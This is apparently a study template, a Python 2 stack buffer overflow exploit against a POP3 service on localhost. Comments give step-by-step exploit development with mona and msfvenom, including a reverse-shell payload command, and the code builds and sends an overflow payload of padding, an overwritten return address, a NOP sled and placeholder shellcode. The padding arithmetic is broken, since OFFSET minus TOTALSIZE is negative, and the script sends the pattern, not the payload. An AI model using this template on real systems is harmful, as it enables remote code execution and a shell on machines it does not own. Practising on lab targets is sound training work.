#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import socket
# for pack
import struct

# 1. Re-create BOF with Pattern
# !mona pc 3000
# metasploit-framework/tools/exploit/pattern_create.rb -l 2000
#     (https://github.com/jbertman/pattern_tools)
PATTERN = "13371337"

# 2. Determine offset to control EIP
# (Manually or using !mona findmsp / !mona sugest)
# (findmsp only works in conjunction with pattern_create.rb)
# CHANGE ME
OFFSET = 1212

# 3. Space: Determine space for shellcode, make size constant
# Might need 360 - 450 bytes for shellcode
# CHANGE ME
TOTALSIZE = 1515

# 4. Filter bad chars
# Create array with all possible chars except the known one: !mona bytearray -cpb "\x00"
# Open bytearray.txt and paste it into the exploit
# Run !mona compare -f C:\<path to>\bytearray.bin -a <start of pattern on stack, e.g. 00AFFD44>
# Add bad char to your notes
# Create new pattern, e.g. !mona bytearray –cpb "\x00\x0a"
# In case of missing space: !mona bytearray -cpb "\x00\x20..\xff"
# 	e.g only creates values from 01..1f
# 	Then continue with !mona bytearray –cpb "\x00..\x1f\x40..\xff"
# 	Don't forget \x00 as bad character!

# 5. Create shellcode, e.g.
# msfvenom -f python --var-name _shellcode_ -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

# 6. Add padding with NOPs before the shellcode begings (\x90) - e.g. 8 - 20 bytes

# 7. Determine return address
# In case we are in control of ESP: jmp ESP needed
# Find one in the binary or in a DLL
# Value to search for: https://defuse.ca/online-x86-assembler.htm#disassembly
# jmp ESP = FF E4 --> reverse --> search for \xff\xe4
# Find a module to search in: !mona modules
#	Has to be without Rebase, (SafeSEH), ASLR and NXCompat
# !mona find -s "\xff\xe4" -m <module>.dll
# Verify with disassembly
# Or quicker: !mona jmp -r esp -cpb "<Bad Chars>"

# 8. Assemble payload
# in case \0x0a in not a bad char:
# "A" * <offset> + Return adress with reversed endianness + [Padding (NOPs) or SUB_ESP] + Shellcode

# 9. EDIT THE CODE TO SEND PAYLOAD!

# 10. Not working?
# Try calc.exe with thread exitfunc:
# msfvenom -p windows/exec -b '<Bad Chars>' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread

# For step 8: Either create nop sled or arrange ESP
NOP = "\x90"
# From metasploit-framework/tools/exploit/metasm_shell.rb
# SUB ESP 10 (Value has to be divisible by 4 -- 0x10 == 16)
SUB_ESP = "\x83\xec\x10"

# From 0x78563412 to 0x12345678
EIP = struct.pack("<I", 0x78563412)
# INT 3 interrupt
SHELLCODE = ("\xCC\xCC\xCC\xCC")

PAYLOAD = ""
PAYLOAD += "A" * (OFFSET - TOTALSIZE)
PAYLOAD += EIP # (Overwrite SRP)

# Use one or the other
# PAYLOAD += SUB_ESP
PAYLOAD += NOP * 12 # For encoded payloads

PAYLOAD += SHELLCODE

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(('127.0.0.1', 110))
    print "\nHacking..."

    # receive banner
    data = s.recv(1024)
    print data

    s.send('USER test' +'\r\n')
    data = s.recv(1024)
    print data

    s.send('PASS ' + PATTERN + '\r\n')
    data = s.recv(1024)
    print data

    s.close()
    print "\nDone!"
except Exception as e:
	print e
	print "Could not connect."
